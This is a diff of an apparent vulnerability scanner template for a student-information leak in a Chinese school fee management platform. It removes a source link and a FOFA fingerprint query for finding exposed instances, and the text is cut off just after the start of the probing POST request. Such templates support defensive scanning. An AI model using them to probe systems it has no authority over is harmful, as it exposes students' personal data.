@@ -3,12 +3,8 @@ info:
   name: 博友科技-校盈家财务收费管理平台 getstudent 信息泄露
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/srwayvcntq2swz79'
+  description: ''
   tags: info-leak,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: srwayvcntq2swz79
-    fofa: body="/Content/index1.css" && body="财务收费管理"
 http:
 - raw:
   - 'POST /RecruitStudent/GetStudent HTTP/1.1
